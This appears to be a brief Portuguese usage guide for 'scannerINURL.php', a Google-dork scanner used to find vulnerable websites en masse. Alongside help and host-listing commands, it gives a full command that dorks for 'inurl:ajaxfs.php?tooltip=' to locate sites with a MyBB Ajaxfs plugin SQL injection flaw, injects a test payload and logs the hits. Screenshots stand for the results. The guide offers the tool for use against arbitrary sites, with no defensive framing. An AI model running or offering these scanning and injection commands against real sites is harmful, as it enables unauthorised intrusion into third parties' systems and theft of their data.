Executando:

# AJUDA #
**[root@inurl]#  php scannerINURL.php ajuda**

![http://3.bp.blogspot.com/-3oy16OFadZE/UpXy7ccZ_HI/AAAAAAAAC3c/0bTHncgrTgU/s1600/1397143_551366278281070_2019414554_o.png](http://3.bp.blogspot.com/-3oy16OFadZE/UpXy7ccZ_HI/AAAAAAAAC3c/0bTHncgrTgU/s1600/1397143_551366278281070_2019414554_o.png)

## LISTAR HOST'S GOOGLE, caso seja bloqueado use outro host. ##
**[root@inurl]#  php scannerINURL.php hosts**

![http://4.bp.blogspot.com/-wIfcj0hAHgA/UpXzYYTnanI/AAAAAAAAC3k/pYTa28G6jMI/s1600/hosts.png](http://4.bp.blogspot.com/-wIfcj0hAHgA/UpXzYYTnanI/AAAAAAAAC3k/pYTa28G6jMI/s1600/hosts.png)



# USANDO EXPLOIT #
# Procurando por falhas: #
  * _"Mybb Ajaxfs Plugin Sql Injection vulnerability"_
**[root@inurl]#  php scannerINURL.php --host="www.google.com.br" --dork="inurl:ajaxfs.php?tooltip=" --arquivo="resultado.txt" --tipoerro="1" --exploit="'\--0x27;"**

![http://4.bp.blogspot.com/-kc_ZpiL5TGk/UpZKUnpP4sI/AAAAAAAAC4I/WxSTK8gUEbY/s1600/snapshot14.png](http://4.bp.blogspot.com/-kc_ZpiL5TGk/UpZKUnpP4sI/AAAAAAAAC4I/WxSTK8gUEbY/s1600/snapshot14.png)

### RESULTADO: ###
![http://4.bp.blogspot.com/-UI-WaQqSqfw/UpZK4VnEdaI/AAAAAAAAC4M/Cx8DbRzL-8c/s1600/snapshot13.png](http://4.bp.blogspot.com/-UI-WaQqSqfw/UpZK4VnEdaI/AAAAAAAAC4M/Cx8DbRzL-8c/s1600/snapshot13.png)